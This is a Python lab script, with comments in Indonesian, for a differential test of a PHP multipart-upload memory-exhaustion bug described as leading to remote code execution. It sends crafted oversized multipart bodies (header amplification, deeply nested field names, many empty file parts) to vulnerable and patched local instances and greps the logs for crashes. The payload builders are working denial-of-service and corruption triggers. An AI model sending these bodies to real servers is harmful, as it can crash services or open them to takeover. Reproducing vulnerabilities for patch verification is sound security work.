#!/usr/bin/env python3
"""Uji diferensial CVE-2026-109618 (PHP: RCE via OOM corruption).

Mengirim POST multipart/form-data dengan beberapa "OOM strategy" yang
disebutkan di advisory GHSA-w8hw-w9fx-j79w:

  headers   : satu part dengan N header tambahan (amplifikasi memori)
  nested    : nama field bersarang (multiplikasi array)
  emptyfile : banyak file control kosong (tidak dihitung max_file_uploads)
  nolen     : body multipart tanpa Content-Length yang cocok (kode 411)

Script membandingkan instance vulnerable (PHP 8.4.11, port 8091) vs
patched (PHP 8.4.27, port 8092) dan melaporkan response + potongan log.

Hanya berjalan terhadap 127.0.0.1.
"""
import argparse
import os
import re
import socket
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
RUN = os.path.join(LAB, "run")


def build_body(strategy, n, boundary="----BB"):
    parts = []
    if strategy == "headers":
        # 1 header pendek (~5 byte di wire) -> struct internal jauh lebih besar.
        hdr = "".join(f"X:\r\n" for _ in range(n))
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n"
            + hdr + "\r\nx\r\n")
    elif strategy == "nested":
        # Satu field dengan nama sangat dalam -> hash/array bertingkat.
        name = "a" + "[b]" * n
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\nv\r\n")
    elif strategy == "emptyfile":
        # File control kosong: tidak menghitung max_file_uploads tapi tetap
        # membuat array metadata file.
        for i in range(n):
            parts.append(
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"f{i}\"; filename=\"\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n\r\n")
    else:
        raise ValueError(strategy)
    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode()


def raw_post(host, port, body, boundary="----BB", omit_length=False, extra_headers=""):
    """Kirim HTTP/1.1 POST lewat socket mentah agar bisa mengatur/melewatkan Content-Length."""
    head = (
        f"POST /info.php HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    )
    if not omit_length:
        head += f"Content-Length: {len(body)}\r\n"
    head += "Connection: close\r\n" + extra_headers + "\r\n"
    try:
        s = socket.create_connection((host, port), timeout=60)
        s.settimeout(60)
        s.sendall(head.encode() + body)
        chunks = []
        while True:
            try:
                b = s.recv(65536)
            except socket.timeout:
                break
            if not b:
                break
            chunks.append(b)
        s.close()
        return b"".join(chunks)
    except Exception as e:  # noqa: BLE001
        return f"ERR {e}".encode()


def summarize(resp):
    if resp.startswith(b"ERR"):
        return resp.decode()
    head, _, body = resp.partition(b"\r\n\r\n")
    status = head.split(b"\r\n")[0].decode(errors="replace")
    txt = re.sub(rb"<[^>]+>", b" ", body)
    txt = txt.decode(errors="replace").strip().replace("\n", " ")
    txt = re.sub(r"\s+", " ", txt)[:180]
    return f"{status} | {txt}"


def tail_log(path, pattern, lines=6):
    if not os.path.exists(path):
        return "(tidak ada log)"
    with open(path, "rb") as f:
        data = f.read().decode(errors="replace").splitlines()
    hits = [l for l in data if re.search(pattern, l, re.I)]
    return " || ".join(hits[-lines:]) if hits else "(tidak ada baris cocok)"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--strategy", default="headers", choices=["headers", "nested", "emptyfile"])
    ap.add_argument("-n", type=int, default=100000)
    ap.add_argument("--ports", default="8091,8092")
    args = ap.parse_args()

    ports = [int(p) for p in args.ports.split(",")]
    body = build_body(args.strategy, args.n)
    print(f"strategy={args.strategy} n={args.n} wire={len(body)/1048576:.2f}MB\n")

    for port in ports:
        tag = "vuln " if port == 8091 else "fixed"
        t0 = time.time()
        resp = raw_post("127.0.0.1", port, body)
        dt = time.time() - t0
        print(f"[{tag} :{port}] {dt:6.2f}s  {summarize(resp)}")
        for pat, name in [
            (r"Allowed memory size|Out of memory|memory exhausted", "OOM"),
            (r"exit signal|Segmentation|segfault|bus error|core dumped", "CRASH"),
            (r"PHP (Fatal|Warning|Notice)", "PHPERR"),
            (r"Premature end|malformed|bad content-length", "APACHE"),
        ]:
            lp = os.path.join(RUN, "vuln" if port == 8091 else "fixed", "httpd.conf.error.log")
            hits = tail_log(lp, pat, lines=3)
            if hits != "(tidak ada baris cocok)":
                print(f"    {name:7s}: {hits[:400]}")
        print()


if __name__ == "__main__":
    main()
